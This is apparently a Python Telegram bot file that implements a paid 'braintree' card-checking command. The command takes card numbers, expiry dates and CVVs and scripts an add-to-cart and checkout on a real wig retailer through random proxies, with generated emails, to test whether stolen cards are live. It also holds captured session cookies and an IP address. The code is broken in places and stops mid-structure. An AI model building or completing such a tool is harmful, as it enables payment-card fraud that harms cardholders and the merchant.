import requests as r 
import string, random, re, time, argparse, base64
from datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode


@Client.on_message(filters.command(["braintree", "b3"], ["/", ",", ".", ";", "-"]))
async def jaico(client: Client, m: Message):
    card = m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    msg = await m.reply("checking...", quote=True)
    cc_check = await get_live(card, msg)    


BIN_API = "https://bins.antipublic.cc/bins/"


def load_proxies(filename):
    with open(filename, 'r') as file:
        proxies = [{'http': line.strip()} for line in file if line.strip()]
    return proxies

def getIndex(response):
    with open("index.html", "w", encoding="utf-8") as f:
        f.write(response.text)
        
def getStr(text:str, a:str, b:str) -> str:
    return text.split(a)[1].split(b)[0]

def email_generator():
    dominio = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'example.com']
    longitud = random.randint(8, 12) 
    usuario = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(longitud))
    correo = usuario + '@' + random.choice(dominio)
    return correo

def open_files(file):
    with open(file, 'r') as f: return [line.strip() for line in f]

async def get_live(card, msg):
    card = card.replace(":", "|").replace("/", "|").replace(" ", "|")
    card_details = card.split("|")
    ccn = card_details[0]
    month = card_details[1]
    year = card_details[2]
    cvv = card_details[3]  

    if card[0] == '4':
        card_type = "Visa"
    elif card[0] == '5':
        card_type = 'master-card'
    elif card[0] == '3':
        card_type = "Amex"

    session = r.Session()
    proxies = load_proxies("src/extras/proxies.txt")
    proxy = random.choice(proxies)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

session = r.Session()

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://www.wig.com/hair-loss?sortBy=price%20asc',
    'DNT': '1',
    'Sec-GPC': '1',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=0, i',
}

response = session.get('https://www.wig.com/hair-care/velvet-grip/p/A1736', headers=headers)




# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Second Requests: Adding product to cart ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0',
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.5',
    'x-vol-currency': 'USD',
    'x-vol-locale': 'en-US',
    'x-vol-tenant': '27463',
    'x-vol-site': '52707',
    'x-vol-master-catalog': '1',
    'x-vol-catalog': '3',
    'Content-type': 'application/json',
    'Origin': 'https://www.wig.com',
    'DNT': '1',
    'Sec-GPC': '1',
    'Connection': 'keep-alive',
    'Referer': 'https://www.wig.com/hair-care/velvet-grip/p/A1736?color=Beige&wig-size=Average',
    'Priority': 'u=0',
}

params = {
    'recalculateDynamicCategories': 'True',
}

json_data = {
    'fulfillmentMethod': 'Ship',
    'quantity': 1,
    'product': {
        'options': [
            {
                'attributeFQN': 'tenant~color',
                'name': 'Color',
                'value': 'Beige',
            },
            {
                'attributeFQN': 'Tenant~wig-size',
                'name': 'Size',
                'value': 'Average',
            },
        ],
        'productCode': 'A1736',
        'variationProductCode': 'A1736_BEIGE',
    },
}

response = session.post(
    'https://www.wig.com/api/commerce/carts/current/items/',
    params=params,
    headers=headers,
    json=json_data,
)

id_data = getStr(response.text, 'id":"', '","')


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Third Requests: Loading the cart ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://www.wig.com',
    'DNT': '1',
    'Sec-GPC': '1',
    'Connection': 'keep-alive',
    'Referer': 'https://www.wig.com/cart',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=0, i',
}

data = {
    'id': id_data,
    'coupon-code': '',
}

response = session.post('https://www.wig.com/cart/checkout', headers=headers, data=data)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fourth Requests: Getting the check-out page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://www.wig.com/cart',
    'DNT': '1',
    'Sec-GPC': '1',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=0, i',
}

response = session.get('https://www.wig.com/checkout/'+id_data, headers=headers)


headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://www.wig.com/hair-care/velvet-grip/p/A1736?color=Beige&wig-size=Average',
    'DNT': '1',
    'Sec-GPC': '1',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=0, i',
}

response = session.get('https://www.wig.com/cart', headers=headers)

getIndex(response)



# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fourth Requests: Filling out check-out page (1/?) ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"""

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0',
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.5',
    'x-vol-currency': 'USD',
    'x-vol-locale': 'en-US',
    'x-vol-tenant': '27463',
    'x-vol-site': '52707',
    'x-vol-master-catalog': '1',
    'x-vol-catalog': '3',
    'Content-type': 'application/json',
    'Origin': 'https://www.wig.com',
    'DNT': '1',
    'Sec-GPC': '1',
    'Connection': 'keep-alive',
    'Referer': 'https://www.wig.com/checkout/17dbfdfe35ee4a0001f3654e00006b47',
}

json_data = {
    'receiverVersion': 2,
    'address': {
        'candidateValidatedAddresses': None,
        'countryCode': 'US',
        'addressType': 'Residential',
        'address1': '412 Av park',
        'address2': '',
        'cityOrTown': 'New York',
        'stateOrProvince': 'NY',
        'postalOrZipCode': '10080',
    },
    'candidateValidatedAddresses': None,
    'countryCode': 'US',
    'addressType': 'Residential',
    'address1': '412 Av park',
    'address2': '',
    'cityOrTown': 'New York',
    'stateOrProvince': 'NY',
    'postalOrZipCode': '10080',
}

response = session.post(
    'https://www.wig.com/api/commerce/customer/addressvalidation/',
    headers=headers,
    json=json_data,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fourth Requests: Filling out check-out page (2/?) ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0',
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate, br, zstd',
    'x-vol-currency': 'USD',
    'x-vol-locale': 'en-US',
    'x-vol-tenant': '27463',
    'x-vol-site': '52707',
    'x-vol-master-catalog': '1',
    'x-vol-catalog': '3',
    'Content-type': 'application/json',
    'Origin': 'https://www.wig.com',
    'DNT': '1',
    'Sec-GPC': '1',
    'Connection': 'keep-alive',
    'Referer': 'https://www.wig.com/checkout/17dbfdfe35ee4a0001f3654e00006b47',
    # 'Cookie': 'sb-sf-at-prod-s=at=QDcFI4jHqnJAp2rx7CnRxxyaf6FBc2oLwI11F9Qg5aSJ1lYJzHM7vJo9Ox3IFbM79veajGg4Ad69gPxZDgq7LXlc0h0q8XfZEWqUXs06M6KejhkAxr8laafbe9eig1dTuS8p7EeIpqHo%2FJWy4OJ%2BPv1dbukq5TDY9UfXyKtP6qJ8lMn%2FDxwMGK0jmDsTPQWy2jczuBcxsnKTaXXppX16OzdMZJS8cJjG9ZpYJvOEAp9JjD8FiQ1IWfhD4qMpszrKOC2chX2UCaBqjHMRs0WXAsWlgPHRgqOeJ22NXLKP0cnw%2FDkyNYqzaOQc1Xb7n2kfPGI6QGv12YzfOqLUlN8nyQ%3D%3D&dt=2024-09-07T00%3A25%3A19.7145151Z; sb-sf-at-prod=at=QDcFI4jHqnJAp2rx7CnRxxyaf6FBc2oLwI11F9Qg5aSJ1lYJzHM7vJo9Ox3IFbM79veajGg4Ad69gPxZDgq7LXlc0h0q8XfZEWqUXs06M6KejhkAxr8laafbe9eig1dTuS8p7EeIpqHo%2FJWy4OJ%2BPv1dbukq5TDY9UfXyKtP6qJ8lMn%2FDxwMGK0jmDsTPQWy2jczuBcxsnKTaXXppX16OzdMZJS8cJjG9ZpYJvOEAp9JjD8FiQ1IWfhD4qMpszrKOC2chX2UCaBqjHMRs0WXAsWlgPHRgqOeJ22NXLKP0cnw%2FDkyNYqzaOQc1Xb7n2kfPGI6QGv12YzfOqLUlN8nyQ%3D%3D; _mzvr=ODw3f4R1hE-VJ5U_oOSykw; _mzvs=nn; _mzPc=eyJjb3JyZWxhdGlvbklkIjoiOTIzMjMxYzliOTA5NDhkMmIwNzMwYWNmNDI3MTBhNzYiLCJpcEFkZHJlc3MiOiIxNTUuMTMzLjE1LjMyIiwiaXNEZWJ1Z01vZGUiOmZhbHNlLCJpc0NyYXdsZXIiOmZhbHNlLCJpc01vYmlsZSI6ZmFsc2UsImlzVGFibGV0IjpmYWxzZSwiaXNEZXNrdG9wIjp0cnVlLCJ2aXNpdCI6eyJ2aXNpdElkIjoiTkpQMXJHMXZLVXFmc1dPTkpFSF9iQSIsInZpc2l0b3JJZCI6Ik9EdzNmNFIxaEUtVko1VV9vT1N5a3ciLCJpc1RyYWNrZWQiOmZhbHNlLCJpc1VzZXJUcmFja2VkIjpmYWxzZX0sInVzZXIiOnsiaXNBdXRoZW50aWNhdGVkIjpmYWxzZSwidXNlcklkIjoiYTJkYjRmZjRmNTgwNDkwYTg1ODVmMTk0ZjRkMjZlOTUiLCJmaXJzdE5hbWUiOiIiLCJsYXN0TmFtZSI6IiIsImVtYWlsIjoiIiwiaXNBbm9ueW1vdXMiOnRydWUsImJlaGF2aW9ycyI6WzEwMTRdLCJpc1NhbGVzUmVwIjpmYWxzZX0sInVzZXJQcm9maWxlIjp7InVzZXJJZCI6ImEyZGI0ZmY0ZjU4MDQ5MGE4NTg1ZjE5NGY0ZDI2ZTk1IiwiZmlyc3ROYW1lIjoiIiwibGFzdE5hbWUiOiIiLCJlbWFpbEFkZHJlc3MiOiIiLCJ1c2VyTmFtZSI6IiJ9LCJpc0VkaXRNb2RlIjpmYWxzZSwiaXNBZG1pbk1vZGUiOmZhbHNlLCJub3ciOiIyMDI0LTA5LTA3VDAwOjM2OjE3Ljk2NTMxNDZaIiwiY3Jhd2xlckluZm8iOnsiaXNDcmF3bGVyIjpmYWxzZX0sImN1cnJlbmN5UmF0ZUluZm8iOnt9fQ%3D%3D; __cf_bm=BkveamtEywbsU8InMh2i1do1ecS0cxy6ZYy0t84dyh4-1725669872-1.0.1.1-sFNzewuBhpo5jowXieehRX1phh_U9qck2j0ShEAXSEX53VD0D77e._KiJk3_PtxLIM1rgmuOi0ZJZODhtUK8cw; _scc_bnr={"ids":[1,214],"watch":[{"datalayer":false},{"mediarules":false}],"ts":1725669322}; _gcl_au=1.1.784713359.1725668724; yotpo_pixel=f0dffcda-a0e0-4d1d-a343-8c4a28fedc3b; _sp_id.a2ad=f2361888f2670e0a.1725668725.1.1725669959.1725668725; _sp_ses.a2ad=*; _ga_0TFGTWPV17=GS1.1.1725668725.1.1.1725669831.60.0.0; _ga=GA1.1.1442331632.1725668725; _pin_unauth=dWlkPU1XVTJOMk5sTjJVdE5HSTRPUzAwWm1Ka0xUa3pNVEV0WkRObFltUmpZekUyWXpreg; _mzvt=NJP1rG1vKUqfsWONJEH_bA',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    # Requests doesn't support trailers
    # 'TE': 'trailers',
}

json_data = {
    'orderNumber': 4259198,
    'version': '1',
    'isPartialOrder': False,
    'originalCartId': '17dbfc8535ee4a0001f3653700006b47',
    'priceListCode': '',
    'availableActions': [
        'SetOrderAsErrored',
        'AbandonOrder',
    ],
    'isTaxExempt': False,
    'ipAddress': '155.133.15.32',
    'status': 'Pending',
    'type': 'Online',
    'paymentStatus': 'Unpaid',
    'returnStatus': 'None',
    'isEligibleForReturns': False,
    'totalCollected': 0,
    'attributes': [],
    'shippingDiscounts': [],
    'handlingDiscounts': [],
    'handlingTotal': 0,
    'fulfillmentStatus': 'NotFulfilled',
    'isFulfillable': False,
    'notes': [],
    'items': [
        {
            'id': 'a611befb5d6d4a13837fb1e40009f3e2',
            'originalCartItemId': 'd16ffe115d2c42789a01b1e400083a1e',
            'fulfillmentLocationCode': '1',
            'fulfillmentMethod': 'Ship',
            'isReservationEnabled': False,
            'priceMode': 'Internal',
            'lineId': 1,
            'product': {
                'upc': '800286960322',
                'fulfillmentTypesSupported': [
                    'DirectShip',
                ],
                'imageAlternateText': '',
                'imageUrl': 'https://cdn.wig.com/products/A1736/toi/A1736_1.tif',
                'variationProductCode': 'A1736_BEIGE',
                'options': [
                    {
                        'name': 'Color',
                        'value': 'Beige',
                        'attributeFQN': 'tenant~color',
                        'stringValue': 'Beige|Beige',
                    },
                    {
                        'name': 'Size',
                        'value': 'Average',
                        'attributeFQN': 'Tenant~wig-size',
                        'stringValue': 'Average',
                    },
                ],
                'properties': [
                    {
                        'attributeFQN': 'tenant~base-product-code',
                        'name': 'Base Product Code',
                        'dataType': 'String',
                        'isMultiValue': False,
                        'values': [
                            {
                                'stringValue': 'A1736',
                                'value': 'A1736',
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~has-grey',
                        'name': 'Has Grey',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~has-highlighted',
                        'name': 'Has Highlighted',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~has-red',
                        'name': 'Has Red',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~has-brunette',
                        'name': 'Has Brunette',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~has-rooted-colors',
                        'name': 'Has Rooted Colors',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~hide-swatches-on-pdp',
                        'name': 'Hide Swatches on PDP',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~has-exclusive-colors',
                        'name': 'Has Exclusive Colors',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~clearance',
                        'name': 'Clearance',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~has-blonde',
                        'name': 'Has Blonde',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Turban',
                        'name': 'Turban',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Clip-ons',
                        'name': 'Clip-ons',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Volumizers',
                        'name': 'Volumizers',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Wig',
                        'name': 'Wig',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Extensions',
                        'name': 'Extensions',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Ponytails',
                        'name': 'Ponytails',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Hair-Loss',
                        'name': 'Hair Loss',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Toppers',
                        'name': 'Toppers',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Accessory',
                        'name': 'Accessory',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Headbands',
                        'name': 'Headbands',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Buns---Wraps',
                        'name': 'Buns & Wraps',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Wet-Product',
                        'name': 'Wet Product',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Wiglets',
                        'name': 'Wiglets',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Hairpiece',
                        'name': 'Hairpiece',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Bangs---Fringe',
                        'name': 'Bangs & Fringe',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Clip-in-Extensions',
                        'name': 'Clip-in Extensions',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~Care---Styling',
                        'name': 'Care & Styling',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~5-10-Piece-Extension',
                        'name': '5-10 Piece Extension',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~1-3-Piece-Extensions',
                        'name': '1-3 Piece Extensions',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'tenant~turban-hair-system',
                        'name': 'Turban Hair System',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'tenant~enbl-disbl-prdct-img-rt-ovrrd',
                        'name': 'Enable/Disable Product Image Ratio Override',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'tenant~headband-hair-system',
                        'name': 'Headband Hair System',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~clearance-2',
                        'name': 'Clearance 2',
                        'dataType': 'String',
                        'isMultiValue': False,
                        'values': [
                            {
                                'stringValue': 'False',
                                'value': 'False',
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'tenant~wig_salesrank',
                        'name': 'wig_salesrank',
                        'dataType': 'Number',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': 354,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'tenant~image-shape',
                        'name': 'Image Aspect Ratio',
                        'dataType': 'String',
                        'isMultiValue': False,
                        'values': [
                            {
                                'stringValue': 'Square (1-1)',
                                'value': 'pSq',
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~brand',
                        'name': 'Brand',
                        'dataType': 'String',
                        'isMultiValue': False,
                        'values': [
                            {
                                'stringValue': 'Paula Young®',
                                'value': 'Paula-Young',
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~dropship',
                        'name': 'Dropship',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~final-sale',
                        'name': 'Final Sale',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~new',
                        'name': 'New',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~sale',
                        'name': 'On Sale',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': True,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~returns-for-exchange-only',
                        'name': 'Returns for Exchange Only',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~limited-to-one-per-customer',
                        'name': 'Limited to One Per Customer',
                        'dataType': 'Bool',
                        'isMultiValue': False,
                        'values': [
                            {
                                'value': False,
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~clearance-map',
                        'name': 'Clearance Map',
                        'dataType': 'String',
                        'isMultiValue': True,
                        'values': [
                            {
                                'stringValue': 'False',
                                'value': 'False',
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'Tenant~colorfamily',
                        'name': 'Color',
                        'dataType': 'String',
                        'isMultiValue': True,
                        'values': [
                            {
                                'stringValue': 'Blonde',
                                'value': 'blonde',
                            },
                        ],
                    },
                    {
                        'attributeFQN': 'system~price-list-entry-type',
                        'name': 'PriceListEntryType',
                        'dataType': 'String',
                        'isMultiValue': True,
                        'values': [
                            {
                                'stringValue': 'An example price list entry type',
                                'value': 'PLCODE',
                            },
                        ],
                    },
                ],
                'categories': [
                    {
                        'id': 203,
                    },
                    {
                        'id': 205,
                    },
                    {
                        'id': 329,
                    },
                    {
                        'id': 342,
                    },
                    {
                        'id': 351,
                    },
                    {
                        'id': 356,
                    },
                    {
                        'id': 360,
                    },
                    {
                        'id': 460,
                    },
                    {
                        'id': 473,
                    },
                    {
                        'id': 1142,
                    },
                ],
                'price': {
                    'price': 11,
                    'salePrice': 6.99,
                    'msrp': 12,
                    'priceListCode': 'WIG-WIGCOMCL-36291',
                    'priceListEntryMode': 'Simple',
                },
                'discountsRestricted': False,
                'isTaxable': True,
                'productType': 'Accessory',
                'productUsage': 'Configurable',
                'bundledProducts': [],
                'productCode': 'A1736',
                'name': 'Velvet Grip',
                'description': 'Soft velvet grip headband keeps your wig or scarf in place.',
                'goodsType': 'Physical',
                'isPackagedStandAlone': False,
                'stock': {
                    'manageStock': True,
                    'isOnBackOrder': False,
                    'stockAvailable': 3463,
                    'aggregateInventory': 0,
                    'availableFutureInventories': 0,
                    'totalAvailableStock': 3463,
                    'isSubstitutable': False,
                },
                'measurements': {
                    'height': {
                        'unit': 'in',
                        'value': 1,
                    },
                    'width': {
                        'unit': 'in',
                        'value': 1,
                    },
                    'length': {
                        'unit': 'in',
                        'value': 1,
                    },
                    'weight': {
                        'unit': 'lbs',
                        'value': 1,
                    },
                },
                'fulfillmentStatus': 'Pending',
            },
            'quantity': 1,
            'subtotal': 6.99,
            'extendedTotal': 6.99,
            'taxableTotal': 6.99,
            'discountTotal': 0,
            'discountedTotal': 6.99,
            'shippingTotal': 0,
            'feeTotal': 0,
            'total': 6.99,
            'unitPrice': {
                'extendedAmount': 6.99,
                'listAmount': 11,
                'saleAmount': 6.99,
            },
            'productDiscounts': [],
            'shippingDiscounts': [],
            'data': {
                'imageUrl': 'https://cdn.wig.com/products/A1736/toi/A1736_1.tif',
            },
            'auditInfo': {
                'updateDate': '2024-09-07T00:36:14.301Z',
                'createDate': '2024-09-07T00:36:14.301Z',
                'updateBy': 'a2db4ff4f580490a8585f194f4d26e95',
                'createBy': 'a2db4ff4f580490a8585f194f4d26e95',
            },
            'shippingAmountBeforeDiscountsAndAdjustments': 0,
            'weightedOrderAdjustment': 0,
            'weightedOrderDiscount': 0,
            'adjustedLineItemSubtotal': 6.99,
            'totalWithoutWeightedShippingAndHandling': 6.99,
            'weightedOrderTax': 0,
            'weightedOrderShipping': 0,
            'weightedOrderShippingDiscount': 0,
            'weightedOrderShippingManualAdjustment': 0,
            'weightedOrderShippingTax': 0,
            'weightedOrderHandlingFee': 0,
            'weightedOrderHandlingFeeTax': 0,
            'weightedOrderHandlingFeeDiscount': 0,
            'weightedOrderDuty': 0,
            'totalWithWeightedShippingAndHandling': 6.99,
            'weightedOrderHandlingAdjustment': 0,
            'isAssemblyRequired': False,
        },
        {
            'id': 'bc0a7f96462c4401b29fb1e40009f3e2',
            'originalCartItemId': '19ca66586c864e4aa4e9b1e400083afd',
            'fulfillmentLocationCode': '1',
            'fulfillmentMethod': 'Ship',
            'isReservationEnabled': False,
            'priceMode': 'Internal',
            'lineId': 2,
            'product': {
                'fulfillmentTypesSupported': [
                    'DirectShip',
                ],
                'options': [],
                'properties': [
                    {
                        'attributeFQN': 'tenant~base-product-code',
                        'name': 'Base Product Code',
                        'dataType': 'String',
                        'isMultiValue': False,
                        'values': [
                            {
                                'stringValue': 'DSPT11',
                                'value': 'DSPT11',
                            },
                        ],
                    },
                ],
                'categories': [
                    {
                        'id': 473,
                    },
                ],
                'price': {
                    'price': 1.95,
                },
                'discountsRestricted': True,
                'isTaxable': False,
                'productType': 'Shipping Surcharge',
                'productUsage': 'Standard',
                'bundledProducts': [],
                'productCode': 'DSPT11',
                'name': 'Delivery Surcharge',
                'description': "Our carriers have added a surcharge to their shipping rates, and we've had to institute a $1.95 delivery pass-through surcharge on all packages to defray some of these increased costs. Thank you for your understanding.",
                'goodsType': 'Service',
                'isPackagedStandAlone': False,
                'stock': {
                    'manageStock': False,
                    'isOnBackOrder': False,
                    'availableFutureInventories': 0,
                    'totalAvailableStock': 0,
                    'isSubstitutable': False,
                },
                'measurements': {
                    'height': {
                        'unit': 'in',
                        'value': 1,
                    },
                    'width': {
                        'unit': 'in',
                        'value': 1,
                    },
                    'length': {
                        'unit': 'in',
                        'value': 1,
                    },
                    'weight': {
                        'unit': 'lbs',
                        'value': 1,
                    },
                },
                'fulfillmentStatus': 'Pending',
            },
            'quantity': 1,
            'subtotal': 1.95,
            'extendedTotal': 1.95,
            'taxableTotal': 1.95,
            'discountTotal': 0,
            'discountedTotal': 1.95,
            'shippingTotal': 0,
            'feeTotal': 0,
            'total': 1.95,
            'unitPrice': {
                'extendedAmount': 1.95,
                'listAmount': 1.95,
            },
            'productDiscounts': [],
            'shippingDiscounts': [],
            'auditInfo': {
                'updateDate': '2024-09-07T00:36:14.301Z',
                'createDate': '2024-09-07T00:36:14.301Z',
                'updateBy': 'a2db4ff4f580490a8585f194f4d26e95',
                'createBy': 'a2db4ff4f580490a8585f194f4d26e95',
            },
            'shippingAmountBeforeDiscountsAndAdjustments': 0,
            'weightedOrderAdjustment': 0,
            'weightedOrderDiscount': 0,
            'adjustedLineItemSubtotal': 1.95,
            'totalWithoutWeightedShippingAndHandling': 1.95,
            'weightedOrderTax': 0,
            'weightedOrderShipping': 0,
            'weightedOrderShippingDiscount': 0,
